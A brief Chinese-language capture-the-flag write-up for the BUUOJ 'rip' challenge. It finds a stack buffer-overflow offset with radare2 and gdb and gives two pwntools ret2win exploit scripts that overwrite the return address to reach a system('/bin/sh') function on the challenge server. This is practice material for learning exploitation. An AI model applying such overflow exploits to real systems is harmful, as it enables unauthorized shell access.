# rip

### Solve

1. 先用r2看一下main裡面有什麼東西，可以看到get這個function接著用於是用BOF去測測看，可以得到offset為23

    ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/442a0a07-c2ac-4835-a0e2-785ca6495496/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/442a0a07-c2ac-4835-a0e2-785ca6495496/Untitled.png)

    ※ offset：
    gdb$ pattc 100
    gdb$ crashoff

2. 再用r2的afl看看有哪些function，結果看到可疑的sym.fun，於是點進去看看

    ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e71467a2-0080-4715-a965-f9317dfb4a16/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e71467a2-0080-4715-a965-f9317dfb4a16/Untitled.png)

3. 可以看到裡面直接call了system("/bin/sh")，正是我們的目標，於是我們用disas fun找到fun function的address

    ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7f7dc7ca-49fb-4a82-9f30-f1287207a6be/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7f7dc7ca-49fb-4a82-9f30-f1287207a6be/Untitled.png)

### exp 1

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/164cf9de-4b2a-44d8-a4ff-f67514926211/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/164cf9de-4b2a-44d8-a4ff-f67514926211/Untitled.png)

```python
from pwn import *

host = "node3.buuoj.cn"
port = 29171

r = remote(host, port)
payload = "a"*23
fun = 0x401187 # 0x40118a both correct
payload += p64(fun)
r.sendline(payload)

r.interactive()
```

### exp 2

```python
from pwn import *

host = "node3.buuoj.cn"
port = 29171

r = remote(host, port)
payload = "a"*15
fun = 0x401186
payload += p64(fun)
r.sendline(payload)

r.interactive()
```
